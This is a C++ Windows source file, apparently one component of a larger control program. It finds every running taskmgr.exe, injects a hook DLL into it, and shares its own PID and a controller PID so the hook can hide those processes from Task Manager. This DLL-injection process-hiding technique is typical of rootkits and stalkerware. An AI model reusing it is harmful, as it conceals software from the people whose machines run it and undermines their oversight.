#include <Windows.h>
#include <Tlhelp32.h>
#include <set>
#include <vector>
#include <algorithm>
#include <iterator>
#include <string>

#include "..\..\commonUtils\headers\Logger.h"
#include "..\..\commonUtils\headers\DllInjector.h"
#include "..\..\commonUtils\headers\MemMapFile.h"

using std::vector;
using std::set;
using std::string;

static const set<string> CONTROLLED_TASKMANAGERS = { "taskmgr.exe" };


#if defined _M_X64
static const string TASKMGR_HOOK_DLL_NAME = "..\\indlls\\taskmgrHookDll64.dll";
#elif defined _M_IX86
static const string TASKMGR_HOOK_DLL_NAME = "..\\indlls\\taskmgrHookDll86.dll";
#endif


static int hookTaskmgrProcess(DWORD id, Logger &logger, DllInjector &dllInjector) {
    logger.info("Injecting dll %s into browser process : %lu", TASKMGR_HOOK_DLL_NAME.c_str(), id);
    if (dllInjector.inject(id, TASKMGR_HOOK_DLL_NAME)) {
        logger.error("Cannot inject dll.");
        return 1;
    }
    return 0;
}

static void hookTaskmanagers(set<DWORD> &hookedPids, Logger &logger, DllInjector &dllInjector) {
    const int maxSize = common_consts::MAX_PROCESS_NAME_LENGTH; //max process name length
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;

    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    char chStr[maxSize];

    set<DWORD> openedTaskmgrsIds;

    // looping over all processes and finding taskmgr.exe ...
    while (hRes) {
        size_t len = lstrlenW(pEntry.szExeFile);
        wcstombs_s(&len, chStr, pEntry.szExeFile, maxSize * sizeof(WCHAR));

        if (CONTROLLED_TASKMANAGERS.find(chStr) != CONTROLLED_TASKMANAGERS.end()) {
            openedTaskmgrsIds.insert((DWORD)pEntry.th32ProcessID);
        }

        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);

    vector<DWORD> closedIds;
    vector<DWORD> browsersForHookIds;

    // getting taskmng process ids, which already closed
    set_difference(hookedPids.begin(), hookedPids.end(), openedTaskmgrsIds.begin(), openedTaskmgrsIds.end(),
                   inserter(closedIds, closedIds.end()));

    // browsers ids, which we need to hook
    set_difference(openedTaskmgrsIds.begin(), openedTaskmgrsIds.end(), hookedPids.begin(), hookedPids.end(),
                   inserter(browsersForHookIds, browsersForHookIds.end()));

    for (vector<DWORD>::iterator it = closedIds.begin(); it != closedIds.end(); ++it)
        hookedPids.erase(*it);

    for (vector<DWORD>::iterator it = browsersForHookIds.begin(); it != browsersForHookIds.end(); ++it) {
        hookTaskmgrProcess(*it, logger, dllInjector);
        hookedPids.insert(*it);
    }
}

static void parseCmdLine(LPSTR lpCmdLine, unsigned long &sessionTime, DWORD &procControllPID, int &controlStab) {
    sscanf_s(lpCmdLine, "%lu %i %lu ", &sessionTime, &controlStab, &procControllPID);
}

int CALLBACK WinMain(
    _In_  HINSTANCE hInstance,
    _In_  HINSTANCE hPrevInstance,
    _In_  LPSTR lpCmdLine,
    _In_  int nCmdShow
    )
{
    Logger logger(common_consts::TASKMGR_HOOKER_LOG_FILENAME, true, true, common_consts::IS_TASKMGR_HOOKER_LOGGER_MUTED);

    DllInjector dllInjector;
    unsigned long sessionTime;
    DWORD procControllPID;
    int waitTime;

    // where must be 3 arguments - session duration time, processControll app pid and controll stab time
    parseCmdLine(lpCmdLine, sessionTime, procControllPID, waitTime);

    // writing pids of processes to hide in taskmg.exe to shared file
    logger.info("Creating shared file to write pids");
    my_shared_mem::MemMappedFile sharedFile;
    if (!sharedFile.create(taskmgt_hook_consts::SHARED_FILE_WITH_PIDS,
        (common_consts::UL_MAX_DIGIT_NUMBER + 1) * 2)) {
        logger.error("Cannot create shared file to write pids, error: %lu", GetLastError());
        return 1;
    }

    sharedFile.writeDecimal(procControllPID);
    sharedFile.writeDecimal(GetCurrentProcessId());

    logger.info("Session duration = %lu ; ProcessControll.exe pid = %lu ; Controll Stab = %i", 
                sessionTime,
                procControllPID,
                waitTime);

    set<DWORD> hookedPids = {};
    DWORD startTime = GetTickCount();

    // looping for some specified time ...
    do {
        hookTaskmanagers(hookedPids, logger, dllInjector);
        Sleep(waitTime);
    } while (GetTickCount() - startTime < sessionTime);

    sharedFile.close();

    return 0;
}